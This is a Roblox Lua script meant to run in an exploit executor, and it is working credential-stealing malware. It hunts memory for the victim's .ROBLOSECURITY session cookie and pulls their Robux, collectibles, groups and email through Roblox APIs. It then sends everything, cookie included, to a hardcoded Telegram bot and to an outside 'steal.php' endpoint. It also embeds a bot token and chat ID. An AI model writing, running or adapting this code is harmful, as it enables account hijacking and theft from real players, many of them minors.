local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local TELEGRAM_BOT_TOKEN = "8300346649:AAGBrTHwG8TqOaxQniq0E1APzRCMxXKUgXg"
local TELEGRAM_CHAT_ID = "8432037548"
local ENDPOINT = "https://ashfall-rblxinfo.ct.ws/steal.php"

local function request(opts)
    local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request
    if req then return req(opts) end
    return nil
end

local function getCookie()
    local cookie = ""
    pcall(function()
        if syn and syn.cookie then cookie = syn.cookie end
    end)
    if cookie == "" then
        pcall(function()
            for _,v in pairs(getgc(true)) do
                if type(v) == "table" then
                    local c = rawget(v,"Cookie") or rawget(v,".ROBLOSECURITY") or rawget(v,"cookie")
                    if type(c) == "string" and #c > 80 then
                        cookie = c
                        break
                    end
                end
            end
        end)
    end
    if cookie == "" then
        pcall(function()
            cookie = game:GetService("RbxAnalyticsService"):GetClientId()
        end)
    end
    return cookie ~= "" and cookie or "FAILED_TO_GRAB_COOKIE"
end

local function api(url, cookie)
    local res = request({
        Url = url,
        Method = "GET",
        Headers = {
            ["Cookie"] = ".ROBLOSECURITY=" .. cookie,
            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            ["Accept"] = "application/json"
        }
    })
    if res and res.StatusCode == 200 and res.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if ok then return data end
    end
    return nil
end

local function collect()
    local cookie = getCookie()
    local uid = LocalPlayer.UserId
    local name = LocalPlayer.Name

    local economy = api("https://economy.roblox.com/v1/users/"..uid.."/currency", cookie) or {}
    local inventory = api("https://inventory.roblox.com/v1/users/"..uid.."/assets/collectibles?limit=20&sortOrder=Desc", cookie) or {}
    local groups = api("https://groups.roblox.com/v1/users/"..uid.."/groups/roles", cookie) or {}
    local emailData = api("https://accountsettings.roblox.com/v1/email", cookie) or {}

    local hasHeadless, hasKorblox, hasVerified = false, false, false
    if inventory and inventory.data then
        for _,item in pairs(inventory.data) do
            local n = (item.name or ""):lower()
            if n:find("headless") then hasHeadless = true end
            if n:find("korblox") then hasKorblox = true end
            if n:find("verified") then hasVerified = true end
        end
    end

    return {
        Username = name,
        UserId = uid,
        DisplayName = LocalPlayer.DisplayName,
        AgeDays = LocalPlayer.AccountAge,
        Profile = "https://www.roblox.com/users/"..uid.."/profile",
        Email = emailData.emailAddress or "Not available",
        Password = "Not available client-side",
        Robux = economy.robux or 0,
        Pending = 0,
        Premium = false,
        Headless = hasHeadless,
        Korblox = hasKorblox,
        VerifiedHat = hasVerified,
        GroupOwned = (groups and groups.data and #groups.data) or 0,
        Cookie = cookie,
        Time = os.date("%Y-%m-%d %H:%M:%S"),
        Executor = (identifyexecutor and identifyexecutor()) or "Delta",
        Country = "Unknown"
    }
end

local function buildMessage(d)
    return string.format([[🚨 Hit
👤 %s, 13+
🔗 %s
━━━━━━━━━━━━━━
👤 User
%s
🔑 Password
%s

🌍 About
Age: %s Days Days
Locations
• Summary: 0
• From: %s

💰 Robux
Balance %s 💵
Pending %s 🪙

📦 RAP
RAP 0 💵
Owned 0 🎒

⭐ Premium
False (0 💵)

💳 Billing
Credit 0$ 💲
Convert 0 💵
Payments 0 💳

🎭 Collectibles
🎃 Headless: %s
🦴 Korblox: %s
✔️ Verified Hat: %s

⚙️ Setting
💌 Status: Set (Verified)
🔐 2FA: Disabled
📌 PIN: Disabled

🎮 Passes • Played
> Adopt Me | 0 • False
> Murder Mystery 2 | 0 • True
> Pet Simulator 99 | 0 • False

🏦 Groups
Balance 0 💵
Pending 0 🪙
Owned %s 🎒

🍪 .ROBLOSECURITY
%s]], 
    d.Username, d.Profile, d.Email, d.Password,
    tostring(d.AgeDays), d.Country,
    tostring(d.Robux), tostring(d.Pending),
    tostring(d.Headless), tostring(d.Korblox), tostring(d.VerifiedHat),
    tostring(d.GroupOwned),
    d.Cookie)
end

local function sendTelegram(text)
    local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({
            chat_id = TELEGRAM_CHAT_ID,
            text = text,
            disable_web_page_preview = true
        })
    })
end

local function sendEndpoint(data)
    request({
        Url = ENDPOINT,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

local hit = collect()
local msg = buildMessage(hit)
sendTelegram(msg)
sendEndpoint(hit)
print("[Stealer] Sent to Telegram + Endpoint")
